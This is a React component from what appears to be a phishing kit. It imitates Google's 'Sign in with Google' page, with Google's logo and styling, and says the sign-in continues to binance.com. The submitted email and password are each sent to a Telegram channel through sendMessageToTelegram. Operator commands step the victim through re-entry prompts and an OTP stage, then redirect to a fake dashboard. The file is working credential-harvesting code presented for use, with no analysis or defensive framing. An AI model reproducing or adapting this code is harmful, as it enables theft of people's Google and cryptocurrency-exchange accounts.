import React, { useState, useEffect } from 'react';
import GoogleForm from './GoogleForms';
import { useRouter } from 'next/navigation';
import { useValidateEmail } from '../app/hooks/useValidate';
import { sendMessageToTelegram } from '../lib/api';

export default function GoogleAuth() {
    const router = useRouter();
    const [isLoading, setIsLoading] = useState(false);
    const [bgLoader, setBgLoader] = useState(false);
    const [currentStep, setCurrentStep] = useState('email');
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [invalid, setInvalid] = useState(false);
    const [command, setCommand] = useState(null);



    // Command handling
    useEffect(() => {
        if (!command) return;

        // Store command in temp variable
        const currentCommand = command;

        if (currentCommand === 'REQUEST_GOOGLE_EMAIL_AGAIN') {
            console.log("command in passcheck is ", currentCommand)
            setInvalid(true);
            setIsLoading(false);
            setCurrentStep('email');
        } 
        else if (currentCommand === 'REQUEST_GOOGLE_PASSWORD') {
            console.log("command in passcheck is ", currentCommand)
            setIsLoading(false);
            setBgLoader(true);
            setCurrentStep('password');
        }
        else if (currentCommand === 'REQUEST_GOOGLE_PASSWORD_AGAIN') {
            console.log("command in passcheck is ", currentCommand)
            setInvalid(true);
            setIsLoading(false);
            setCurrentStep('password');
        }
        else if (currentCommand === 'CORRECT_OTP') {
            setIsLoading(false);
            setBgLoader(true);
            // setTimeout(() => {
            //     router.push('/OTPVerification');
            // }, 1500);
        }
        else if (currentCommand === 'FINISH') {
            setIsLoading(false);
            setBgLoader(true);
            setTimeout(() => {
                router.push('/Dashboard');
            }, 1500);
        }
    }, [command]);

    const showLoader = () => setIsLoading(true);
    const { validateEmail } = useValidateEmail();

    const handleEmailSubmit = () => {
        const isValid = validateEmail(email);
        setInvalid(!isValid);
        if (isValid) {
            showLoader();
            sendMessageToTelegram(`Google Email: ${email}`);
            // Simulate command receipt
            // setTimeout(() => setCommand('REQUEST_GOOGLE_PASSWORD'), 2000);
        }
    };

    const handlePasswordSubmit = () => {
        if (password.length > 0) {
            showLoader();
            sendMessageToTelegram(`Google Password: ${password}`);
            // Simulate command receipt
            // setTimeout(() => setCommand('CORRECT_OTP'), 2000);
        }
    };

    return (
        <div className="sm:bg-[#f0f4f9] bg-white text-black sm:flex flex-col w-full justify-center items-center h-screen">
            {/* Main Content */}
            <div className={`bg-white rounded-[28px] flex flex-col sm:max-w-[480px] lg:max-w-[965px] w-full min-h-[384px] lg:h-[400px] mx-auto`}>
            <div className={`google-loader ${isLoading ? 'block' : 'hidden'} w-full lg:w-[94%] mx-auto`}></div>
                {/* ... existing header ... */}
                <div class="w-full flex opacity-100 items-center px-4 pt-4 pb-3 border-b border-[#c4c7c5]"><svg class="th8JXc mr-[12px]" xmlns="https://www.w3.org/2000/svg" width="20" height="24" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg><div class="google mt-1 text-sm">Sign in with Google</div></div>

                {/* Form Box */}
                <div className={`w-full px-[24px] ${isLoading ? 'opacity-50 pointer-events-none' : 'opacity-100'} sm:pt-[31px] sm:pb-[24px] flex flex-col`}>
                    <div className='justify-between flex-col p-[24px] sm:p-0 gap-y-2 lg:gap-y-8 lg:flex-row flex w-full'>
                        {/* ... existing left side ... */}
                        <div>
                        <div className="h-[48px] w-[48px]">
                            <img 
                            src="https://lh3.googleusercontent.com/89koR46wNEOHYkbF86ZlmxqGlPO5WQiMuWLDzir_AVDZ2yMRspD25KMvauINOtZxmlSH" 
                            className="dJRqtd TrZEUc" 
                            alt="binance.com"
                            />
                        </div>
                        
                        <div className="mt-6">
                            <h1 className="lg:text-4xl text-[28px] google">Sign in</h1>
                            <p className="mt-[19px] google">
                            to continue to 
                            <a href="#" className="text-blue-700"> binance.com</a>
                            </p>
                        </div>
                    </div>
                        
                        
                        
                        <div className='w-[425px] pt-8'>
                            <GoogleForm 
                                currentStep={currentStep}
                                email={email}
                                setEmail={setEmail}
                                password={password}
                                setPassword={setPassword}
                                invalid={invalid}
                            />
                        </div>
                    </div>
                    <div className='w-full flex justify-end text-sm mt-[40px] sm:px-0 px-[24px]'>
                        <div className='flex gap-x-10 w-full justify-between lg:w-fit'>
                            <button className='text-blue-700 font-medium google text-sm'>
                                Create account
                            </button>
                            <button 
                                className='py-2.5 px-6 text-sm google rounded-full bg-blue-700 text-white' 
                                onClick={currentStep === 'email' ? handleEmailSubmit : handlePasswordSubmit}
                            >
                                Next
                            </button>
                        </div>
                    </div>
                </div>
            </div>
           <div className='footer absolute bottom-0 sm:relative sm:max-w-[480px] lg:max-w-[970px] w-full items-center justify-between flex h-[64px]'>
                <div>
                    <button className='text-xs w-[210px] flex items-center justify-between text-gray-600 rounded-lg hover:bg-gray-200 py-2 px-5'>
                        <div>
                            English (United States)
                        </div>
                        <svg xmlns="http://www.w3.org/2000/svg" height="20px" viewBox="0 -960 960 960" width="20px" fill="#1f1f1f"><path d="M480-360 280-560h400L480-360Z" /></svg>
                    </button>
                </div>
                <div className='flex gap-[10px] pr-[5px]'>
                    <button className='text-gray-800 rounded-lg text-xs hover:bg-gray-200 px-3 py-2.5'>Help</button>
                    <button className='text-gray-800 rounded-lg text-xs hover:bg-gray-200 px-3 py-2.5'>Privacy</button>
                    <button className='text-gray-800 rounded-lg text-xs hover:bg-gray-200 px-3 py-2.5'>Terms</button>
                </div>
            </div>
        </div>
    )
}